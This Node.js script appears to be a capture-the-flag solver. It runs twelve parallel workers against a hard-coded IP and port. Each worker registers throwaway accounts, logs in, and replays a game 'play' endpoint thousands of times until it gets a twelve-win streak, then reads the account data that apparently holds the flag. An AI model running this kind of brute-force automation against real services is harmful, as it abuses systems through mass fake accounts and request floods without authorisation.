const http = require('http');

const BASE = 'http://46.225.117.62:30012';
const WORKERS = 12;
const MAX_PLAYS = 8000;
let found = false;

function req(method, path, body, cookie='') {
  return new Promise((resolve, reject) => {
    const data = body ? new URLSearchParams(body).toString() : null;
    const u = new URL(BASE + path);
    const opts = {
      hostname: u.hostname,
      port: u.port,
      path: u.pathname + u.search,
      method,
      headers: {
        ...(data ? {'Content-Type':'application/x-www-form-urlencoded','Content-Length': Buffer.byteLength(data)} : {}),
        ...(cookie ? { Cookie: cookie } : {})
      }
    };
    const r = http.request(opts, (res) => {
      let out = '';
      res.on('data', d => out += d.toString());
      res.on('end', () => resolve({status: res.statusCode, headers: res.headers, body: out}));
    });
    r.on('error', reject);
    if (data) r.write(data);
    r.end();
  });
}

async function worker(i) {
  const username = `r${i}_` + Math.random().toString(16).slice(2,8);
  const password = 'pw123456';
  await req('POST','/api/register',{username,password});
  const login = await req('POST','/api/login',{username,password});
  const tokenCookie = (login.headers['set-cookie'] || []).find(v => v.startsWith('token='));
  if (!tokenCookie) throw new Error(`worker ${i}: login failed`);
  const cookie = tokenCookie.split(';')[0];

  let streak = 0;
  for (let p=1; p<=MAX_PLAYS && !found; p++) {
    const pr = await req('POST','/api/play',{action:'cross'},cookie);
    let data = {};
    try { data = JSON.parse(pr.body || '{}'); } catch {}

    if (data.status === 'safe') {
      streak += 1;
      if (streak >= 12) {
        const me = await req('GET','/api/me',null,cookie);
        found = true;
        console.log(`WORKER=${i} USER=${username} PLAY=${p} STREAK=${streak}`);
        console.log(me.body);
        return;
      }
    } else {
      streak = 0;
    }

    if (p % 1000 === 0) process.stdout.write(`w${i}:${p} `);
  }
}

(async()=>{
  await Promise.all(Array.from({length: WORKERS}, (_,idx) => worker(idx+1).catch(e => console.log(String(e)))));
  if (!found) console.log('NO_FLAG_THIS_RUN');
})();
